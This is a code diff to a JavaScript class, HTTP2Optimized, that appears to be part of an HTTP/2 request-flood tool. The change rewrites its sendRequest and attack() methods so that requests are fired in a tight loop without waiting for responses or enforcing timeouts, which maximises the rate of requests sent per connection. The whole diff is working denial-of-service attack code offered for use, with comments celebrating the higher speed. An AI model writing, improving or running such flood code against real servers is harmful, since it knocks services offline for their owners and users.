@@ -129,73 +129,49 @@ export class HTTP2Optimized {
     async sendRequest(client) {
         if (!client || client.destroyed) return;
 
-        return new Promise((resolve) => {
-            try {
-                const req = client.request(this.generateHeaders());
-                
-                // Increment connection counter
-                const count = this.connectionCounter.get(client) || 0;
-                this.connectionCounter.set(client, count + 1);
+        try {
+            const req = client.request(this.generateHeaders());
+            
+            // Increment connection counter
+            const count = this.connectionCounter.get(client) || 0;
+            this.connectionCounter.set(client, count + 1);
 
-                let responseReceived = false;
-                const timeout = setTimeout(() => {
-                    if (!responseReceived) {
-                        req.close();
-                        this.stats.failedRequests++;
-                        resolve();
-                    }
-                }, 5000); // 5s timeout
+            // Fire and forget - don't wait for response!
+            req.on('response', () => {
+                this.stats.successfulRequests++;
+                this.stats.totalPackets++;
+                REQUESTS_SENT.add(1);
+            });
 
-                req.on('response', (headers) => {
-                    responseReceived = true;
-                    clearTimeout(timeout);
-                    this.stats.successfulRequests++;
-                    this.stats.totalPackets++;
-                    REQUESTS_SENT.add(1); // Update global counter
-                });
+            req.on('data', (chunk) => {
+                this.stats.totalBytes += chunk.length;
+                BYTES_SENT.add(chunk.length);
+            });
 
-                req.on('data', (chunk) => {
-                    this.stats.totalBytes += chunk.length;
-                    BYTES_SENT.add(chunk.length); // Update global counter
-                });
-
-                req.on('end', () => {
-                    clearTimeout(timeout);
-                    resolve();
-                });
-
-                req.on('error', () => {
-                    clearTimeout(timeout);
-                    this.stats.failedRequests++;
-                    resolve();
-                });
-
-                req.end();
-                this.stats.totalRequests++;
-                this.stats.totalBytes += 200; // Header size estimate
-                BYTES_SENT.add(200); // Update global counter
-
-            } catch (e) {
+            req.on('error', () => {
                 this.stats.failedRequests++;
-                resolve();
-            }
-        });
+            });
+
+            req.end();
+            
+            // Count immediately, don't wait
+            this.stats.totalRequests++;
+            this.stats.totalBytes += 200;
+            BYTES_SENT.add(200);
+
+        } catch (e) {
+            this.stats.failedRequests++;
+        }
     }
 
     async attack() {
         const client = await this.getConnection();
         if (!client) return;
 
-        const promises = [];
-        const batchSize = this.rpc; // Use full RPC, no limit!
-
-        for (let i = 0; i < batchSize; i++) {
-            promises.push(this.sendRequest(client));
+        // Fire all requests immediately - don't wait!
+        for (let i = 0; i < this.rpc; i++) {
+            this.sendRequest(client); // No await - fire and forget!
         }
-
-        await Promise.allSettled(promises);
-        
-        // No delay - maximum speed!
     }
 
     async start() {
